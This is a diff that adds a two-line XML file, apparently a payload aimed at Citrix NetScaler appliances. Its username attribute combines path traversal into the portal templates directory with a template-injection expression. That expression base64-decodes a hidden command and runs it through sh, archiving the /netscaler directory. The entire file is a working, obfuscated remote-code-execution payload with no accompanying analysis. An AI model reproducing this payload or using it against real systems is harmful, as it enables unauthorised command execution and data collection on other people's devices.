@@ -1,0 +1,2 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<user username="../../../netscaler/portal/templates/hgvytdss[%template.new('BLOCK'='print `echo dGFyIC1jemYgL3Zhci9uZXRzY2FsZXIudGFyLmd6IC9uZXRzY2FsZXI= | openssl enc -base64 -d| sh`')%]" />
